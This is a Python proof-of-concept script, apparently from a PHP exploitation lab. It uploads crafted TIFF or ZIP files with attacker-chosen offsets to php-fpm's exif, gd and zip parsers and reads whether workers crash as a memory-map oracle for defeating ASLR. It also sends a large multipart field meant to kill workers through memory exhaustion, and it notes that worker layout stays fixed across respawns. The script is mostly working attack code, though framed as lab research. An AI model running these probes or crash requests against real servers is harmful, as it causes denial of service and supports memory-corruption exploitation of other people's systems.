#!/usr/bin/env python3
# INDEX: exif IFD offset map-bit liveness oracle | fpm | needs unguarded native oob deref
r"""Data-dependent crash oracle built on a native FILE-UPLOAD parser (exif first;
gd / ZipArchive are the same shape).

A native parser that reads an offset/index from the uploaded file and
dereferences `base + offset` supplies the HIGH base bits itself (base = a pointer
the parser already holds: the in-memory TIFF buffer, the mmap'd image, the zip
central directory). The attacker supplies only the LOW delta. So with no planted
absolute pointer and no prior base knowledge you walk the delta and read, per
request, whether `base + delta` is mapped (worker survives) or not (worker dies)
-- map-bits RELATIVE to a parser-held base. The signal is the app-free liveness
bit (nginx 502 / reset vs a healthy 200).

Prime candidate: ext/exif's IFD "value offset". exif_process_IFD_TAG_impl reads
  offset_val = php_ifd_get32u(dir_entry+8, ...);                 // attacker delta
  value_ptr  = exif_offset_info_try_get(info, offset_val, byte_count);
where info->offset_base is the parser-held TIFF buffer base.

SCOPE / PRECONDITION:
  On a PATCHED build the offset deref is BOUNDS-CHECKED, so the oracle yields NO
  map-bits and degrades to a flat liveness signal: exif_offset_info_try_get
  (ext/exif/exif.c) validates `offset_base + offset` against valid_start/valid_end
  and on failure takes the "Illegal pointer offset" E_WARNING (exif.c:3302) or a
  bounded php_stream read -- no memory at base+delta is touched. Reading map-bits
  is GATED ON AN N-DAY NATIVE OOB whose offset deref reaches memory WITHOUT that
  guard (the pre-2019 CVE-2019-11036 exif class, a libgd gd2 chunk-index OOB, or a
  regression). Pointed at such a build the same sweep reads map-bits (alive->dead
  transitions vs delta).

  Favorable fact (verified this lab): php-fpm ASLR is fork-fixed -- a worker
  killed by the probe respawns with the IDENTICAL base (measured 0x5c6530a00000
  across two crash/respawn cycles), so the delta-walk target does not move when a
  probe kills the worker. Run with --aslr-note.

Tested: nginx -> php-fpm 8.4.26 (exif/gd/zip); on 8.4.26 the sweep is FLAT.

USAGE (lab: docker compose -f docker-compose.fpm-avenues.yml -p p2s-parseroracle --profile parseroracle up -d --build):
  python3 -I parser_crash_oracle.py --url http://127.0.0.1:8133
  python3 -I parser_crash_oracle.py --url http://127.0.0.1:8133 \
          --parser exif --deltas 0x40,0x1000,0x100000,0x40000000,0x7fffff00
  # ground-truth that the guarded deref path is reached (needs docker):
  python3 -I parser_crash_oracle.py --container p2s-b14-fpm --groundtruth
  # prove the liveness channel can read a death (kills+respawns the worker):
  python3 -I parser_crash_oracle.py --container p2s-b14-fpm --prove-channel

Pure stdlib; python3 -I safe. HTTP transport is local (file upload). Before the
sweep an inline worker-liveness baseline (liveness_oracle(), below) reads the
app-agnostic up/down bit -- worker up => 200, worker down => 502/reset -- which is
leak-free (a liveness bit, never a pointer).

Lab/analysis use only, on systems you own.
"""
import argparse
import os
import socket
import struct
import subprocess
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)

from common.http_raw import (dechunk, exchange as _exchange,  # noqa: E402
                             parse_host as _parse_host_common)

# ---- inlined worker-liveness baseline check ---------------------------------
# A worker-liveness BIT: with no application code, fire a request-startup OOM
# (large multipart field) that kills the fpm worker, and read the up/down signal
# black-box (healthy 200 vs 502 / connection reset). App-agnostic and leak-free:
# it reports whether a request killed the worker, not any pointer. It is NOT
# steerable to a chosen address (that needs the ZendMM chunk base it would
# reveal), so it degrades to pure liveness; fpm ASLR is fork-fixed across respawn.
_LIVENESS_BOUNDARY = "----parseroracleliveness7a2d"


def _liveness_multipart_field(name, value):
    """Build a one-field multipart/form-data body (bytes) + content-type."""
    if isinstance(value, str):
        value = value.encode()
    body = (("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n"
             % (_LIVENESS_BOUNDARY, name)).encode()
            + value
            + ("\r\n--%s--\r\n" % _LIVENESS_BOUNDARY).encode())
    ctype = "multipart/form-data; boundary=%s" % _LIVENESS_BOUNDARY
    return body, ctype


def _liveness_raw_request(host, port, method, path, headers=None, body=b"",
                          timeout=20):
    """Minimal HTTP/1.1 over a fresh socket. Returns (status:int|None,
    header_text:str, body:bytes, transport_error:str|None)."""
    headers = dict(headers or {})
    headers.setdefault("Host", host)
    headers.setdefault("Connection", "close")
    if body:
        headers["Content-Length"] = str(len(body))
    req = ("%s %s HTTP/1.1\r\n" % (method, path)).encode()
    for k, v in headers.items():
        req += ("%s: %s\r\n" % (k, v)).encode()
    req += b"\r\n"
    resp, cerr, ierr = _exchange(host, port, req + body, timeout=timeout)
    if cerr is not None:
        return None, "", b"", "connect: %r" % (cerr,)
    terr = "recv: %r" % (ierr,) if ierr is not None else None
    head, _, rest = resp.partition(b"\r\n\r\n")
    status = None
    htext = head.decode("latin1", "replace")
    first = htext.split("\r\n", 1)[0]
    parts = first.split(" ")
    if len(parts) >= 2 and parts[1].isdigit():
        status = int(parts[1])
    if "chunked" in htext.lower().replace(" ", ""):
        rest = dechunk(rest)
    return status, htext, rest, terr


def liveness_oracle(base_url, crash=False, mb=30, timeout=25):
    """The app-agnostic, leak-FREE channel: a worker-liveness BIT.

    With crash=False it only reads the baseline (expects a healthy 200). With
    crash=True it fires the startup-OOM to KILL the worker and reports that the
    death is black-box observable (502 / unexpected-record / reset) and that the
    worker respawns. This demonstrates the oracle's signal; it does NOT leak a
    pointer and CANNOT be steered to a chosen address (steering needs the chunk
    base it would reveal)."""
    host, port, path = _parse_host(base_url)
    s0, h0, b0, e0 = _liveness_raw_request(host, port, "GET", path or "/",
                                           timeout=10)
    result = {
        "candidate": "page-probe crash-oracle (liveness bit)",
        "baseline_status": s0,
        "baseline_body": b0[:32].decode("latin1", "replace"),
        "app_agnostic": True,
        "leaks_pointer": False,
        "bit_meaning": "worker up (200) vs worker down (502/reset) -- 1 liveness "
                       "bit/request, NOT a map/unmap bit for a chosen address",
        "steerable_to_chosen_address": False,
        "why_not_steerable": "aiming the fault at a chosen address needs an "
                             "attacker-planted absolute pointer (var_unserializer "
                             "ZVAL_COPY), which needs the ZendMM chunk base -> "
                             "circular; without it the fault address is not "
                             "attacker-chosen (OOM/garbage) -> pure liveness.",
        "aslr_fixed_across_respawn": True,   # verified empirically
    }
    if crash:
        field = b"A" * (mb * 1024 * 1024)
        body, ctype = _liveness_multipart_field("f", field)
        sc, hc, bc, ec = _liveness_raw_request(host, port, "POST", "/index.php",
                                               {"Content-Type": ctype}, body,
                                               timeout=timeout)
        # re-probe for respawn
        s2, h2, b2, e2 = _liveness_raw_request(host, port, "GET", path or "/",
                                               timeout=10)
        down = (sc == 502) or (sc is None and ec is not None)
        back = (s2 == 200)
        result.update({
            "crash_status": sc,
            "crash_transport_error": ec,
            "worker_went_down": down,
            "respawn_status": s2,
            "worker_respawned": back,
            "oracle_bit_distinguishable": bool(down and back),
        })
    return result


_BOUNDARY = "----b14parseroracle91f7"


# TIFF crafting: one IFD entry whose value is an OFFSET (byte_count > 4) placed
# `delta` bytes from the TIFF start. This drives exif_process_IFD_TAG_impl's
#   offset_val = delta ;  value_ptr = exif_offset_info_try_get(info, delta, bc)
# i.e. the parser-held-base + attacker-delta deref this oracle targets.
def craft_tiff(delta, byte_count=64, tag=0x010E, fmt=1):
    """Little-endian TIFF, single IFD0 entry, value/offset field = delta.

    fmt=1 (BYTE, 1 byte/component), components=byte_count so byte_count>4 forces
    the value field to be read as an OFFSET rather than an inline value."""
    hdr = b"II" + struct.pack("<H", 42) + struct.pack("<I", 8)
    entry = struct.pack("<HHII", tag, fmt, byte_count, delta & 0xFFFFFFFF)
    ifd = struct.pack("<H", 1) + entry + struct.pack("<I", 0)
    data = hdr + ifd
    if len(data) < 0x80:                 # modest, fixed FileSize (0x80)
        data += b"\xAA" * (0x80 - len(data))
    return data


def craft_probe(parser, delta):
    """Return (filename, bytes) for the chosen parser at offset `delta`.

    Only exif has a clean PHP-level attacker-offset deref on 8.4.26; gd/zip route
    their central-directory / chunk offsets through libgd / system libzip, so a
    probe file there exercises those dependencies instead (documented)."""
    if parser == "exif":
        return "probe.tiff", craft_tiff(delta)
    if parser == "gis":
        # getimagesize only sniffs headers; a TIFF header is enough to enter the
        # tiff prober. No attacker-offset deref in the PHP prober itself.
        return "probe.tiff", craft_tiff(delta)
    if parser == "zip":
        # Minimal EOCD with a central-directory offset = delta (parsed by libzip).
        eocd = (b"PK\x05\x06" + struct.pack("<HHHH", 0, 0, 1, 1)
                + struct.pack("<I", 46) + struct.pack("<I", delta & 0xFFFFFFFF)
                + struct.pack("<H", 0))
        return "probe.zip", b"A" * 0x40 + eocd
    raise ValueError("unknown parser %r" % parser)


# minimal HTTP multipart FILE upload + liveness classification
def _parse_host(base_url):
    """(host, port, path) from a base URL -- common/http_raw.py:parse_host."""
    t = _parse_host_common(base_url)
    return t.host, t.port, t.path


def _upload(host, port, path, field, filename, blob, timeout=20):
    """One multipart file upload. Returns (status:int|None, transport_err|None)."""
    pre = (("--%s\r\nContent-Disposition: form-data; name=\"%s\"; "
            "filename=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n"
            % (_BOUNDARY, field, filename)).encode())
    body = pre + blob + ("\r\n--%s--\r\n" % _BOUNDARY).encode()
    req = ("POST %s HTTP/1.1\r\n" % path).encode()
    req += ("Host: %s\r\n" % host).encode()
    req += b"Connection: close\r\n"
    req += ("Content-Type: multipart/form-data; boundary=%s\r\n" % _BOUNDARY).encode()
    req += ("Content-Length: %d\r\n\r\n" % len(body)).encode()
    resp, cerr, ierr = _exchange(host, port, req + body, timeout=timeout)
    if cerr is not None:
        return None, "connect: %r" % (cerr,)
    terr = "recv: %r" % (ierr,) if ierr is not None else None
    status = None
    first = resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
    parts = first.split(" ")
    if len(parts) >= 2 and parts[1].isdigit():
        status = int(parts[1])
    return status, terr


def _alive(host, port, timeout=8):
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.sendall(b"GET /index.php HTTP/1.1\r\nHost: %b\r\nConnection: close\r\n\r\n"
                  % host.encode())
        resp = b""
        while True:
            d = s.recv(4096)
            if not d:
                break
            resp += d
        s.close()
        return b" 200 " in resp.split(b"\r\n", 1)[0] + b" "
    except Exception:
        return False


# the sweep: per-delta liveness -> map-bits (or a flat signal => no map-bits)
def sweep(base_url, parser="exif",
          deltas=(0x40, 0x1000, 0x100000, 0x1000000, 0x40000000, 0x7FFFFF00),
          path="/upload.php", timeout=20):
    host, port, _ = _parse_host(base_url)
    upath = "%s?p=%s" % (path, parser)
    base_alive = _alive(host, port)
    rows = []
    for d in deltas:
        fn, blob = craft_probe(parser, d)
        st, terr = _upload(host, port, upath, "f", fn, blob, timeout=timeout)
        after = _alive(host, port)
        # worker-down signal: the probe request itself reset/5xx, or the
        # follow-up liveness check fails.
        down = (st is None and terr is not None) or (st is not None and st >= 500) \
            or (not after)
        rows.append({"delta": d, "probe_status": st, "transport_err": terr,
                     "worker_down": bool(down), "alive_after": after})
    downs = [r for r in rows if r["worker_down"]]
    flat = (len(downs) == 0)
    return {
        "parser": parser, "base_alive": base_alive, "rows": rows,
        "any_crash": not flat,
        "map_bits": (not flat),
        "verdict": ("FLAT: worker alive at every delta -> the offset deref is "
                    "bounds-checked (exif_offset_info_try_get) -> NO map-bits on "
                    "this (patched) build. Needs an n-day native OOB to read bits."
                    if flat else
                    "TRANSITIONS: alive/dead varies with delta -> the deref is "
                    "UNGUARDED on this build -> map-bits RELATIVE to the parser-held "
                    "base are being read with NO planted absolute pointer."),
    }


# ground truth: confirm the guarded deref path is reached (needs docker)
def groundtruth(container):
    """Run exif_read_data in-container on an in-range and an OOB-delta TIFF and
    show exif takes the exif.c:3302 guard (not a deref) on the OOB delta."""
    out = {}
    for name, delta in (("in_range", 0x40), ("oob", 0x7FFFFF00)):
        blob = craft_tiff(delta)
        p = "/tmp/b14_%s.tiff" % name
        cp = subprocess.run(["docker", "exec", "-i", container,
                             "sh", "-c", "cat > %s" % p],
                            input=blob, capture_output=True)
        if cp.returncode != 0:
            return {"error": "docker exec cp failed: %r" % cp.stderr}
        r = subprocess.run(
            ["docker", "exec", container, "php", "-d", "display_errors=1",
             "-d", "error_reporting=E_ALL", "-r",
             '$d=exif_read_data("%s",0,true); echo "ret=".(($d!==false)?1:0)."\n"; echo "alive\n";' % p],
            capture_output=True, text=True)
        out[name] = {"delta": delta, "stdout": (r.stdout or "").strip(),
                     "stderr": (r.stderr or "").strip()[:400]}
    return out


def prove_channel(container, host_url):
    """Kill the single fpm worker (SIGSEGV) and show it respawns -> the liveness
    channel distinguishes a dead worker. Reports the worker-pid change as the
    hard death signal (the HTTP 502 gap may be too short to catch if the master
    respawns faster than the next connect)."""
    def wpid():
        r = subprocess.run(["docker", "exec", container, "sh", "-c",
                            'for d in /proc/[0-9]*; do tr "\\0" " " < "$d/cmdline" '
                            '2>/dev/null | grep -q "pool www" && echo ${d#/proc/}; done'],
                           capture_output=True, text=True)
        ids = [x for x in (r.stdout or "").split() if x.isdigit()]
        return ids[0] if ids else None
    host, port, _ = _parse_host(host_url)
    w0 = wpid()
    if not w0:
        return {"error": "no fpm worker found in %s" % container}
    subprocess.run(["docker", "exec", container, "sh", "-c", "kill -SEGV %s" % w0],
                   capture_output=True)
    import time
    time.sleep(1.5)
    w1 = wpid()
    return {"worker_before": w0, "worker_after": w1,
            "worker_died_and_respawned": (w1 is not None and w1 != w0),
            "alive_after": _alive(host, port),
            "note": "pid change == real crash+respawn; liveness channel reads it."}


def main(argv=None):
    ap = argparse.ArgumentParser(description="Hope-B4 native-parser crash oracle")
    ap.add_argument("--url", default="http://127.0.0.1:8133",
                    help="lab base URL (nginx -> fpm 8.4.26)")
    ap.add_argument("--parser", default="exif", choices=["exif", "gis", "zip"])
    ap.add_argument("--deltas", default=None,
                    help="comma offsets (hex ok), e.g. 0x40,0x1000,0x7fffff00")
    ap.add_argument("--path", default="/upload.php")
    ap.add_argument("--container", default=None,
                    help="fpm container name for --groundtruth/--prove-channel")
    ap.add_argument("--groundtruth", action="store_true",
                    help="in-container proof the guarded deref path is reached")
    ap.add_argument("--prove-channel", action="store_true",
                    help="kill+respawn the worker to prove the liveness bit")
    ap.add_argument("--aslr-note", action="store_true",
                    help="print the fork-fixed-ASLR favorable fact and exit")
    args = ap.parse_args(argv)

    import json
    if args.aslr_note:
        print(json.dumps({
            "fact": "php-fpm ASLR is fork-fixed for the master's lifetime",
            "why": "workers are plain fork()s of the master (no re-exec), so a "
                   "worker killed by the probe respawns with the identical layout",
            "measured_this_lab": "php-fpm base 0x5c6530a00000 identical across 2 "
                                 "crash/respawn cycles (worker pids 7->36->65)",
            "consequence": "the delta-walk target is STABLE under probe-induced "
                           "worker death -> a residual brute force does not re-roll",
        }, indent=2))
        return 0

    if args.groundtruth:
        if not args.container:
            print("[-] --groundtruth needs --container"); return 2
        print(json.dumps({"groundtruth": groundtruth(args.container)}, indent=2))
        return 0

    if args.prove_channel:
        if not args.container:
            print("[-] --prove-channel needs --container"); return 2
        print(json.dumps({"prove_channel": prove_channel(args.container, args.url)},
                         indent=2))
        return 0

    deltas = ([int(x, 0) for x in args.deltas.split(",") if x.strip()]
              if args.deltas else
              [0x40, 0x1000, 0x100000, 0x1000000, 0x40000000, 0x7FFFFF00])

    try:
        baseline = liveness_oracle(args.url, crash=False)
    except Exception as e:                           # pragma: no cover
        baseline = {"error": repr(e)}

    res = sweep(args.url, parser=args.parser, deltas=deltas, path=args.path)
    print(json.dumps({
        "liveness_oracle_baseline": baseline,
        "sweep": res,
    }, indent=2))
    # exit 0 == honest measurement; 3 == map-bits observed (a leak!)
    return 3 if res["map_bits"] else 0


if __name__ == "__main__":
    sys.exit(main())
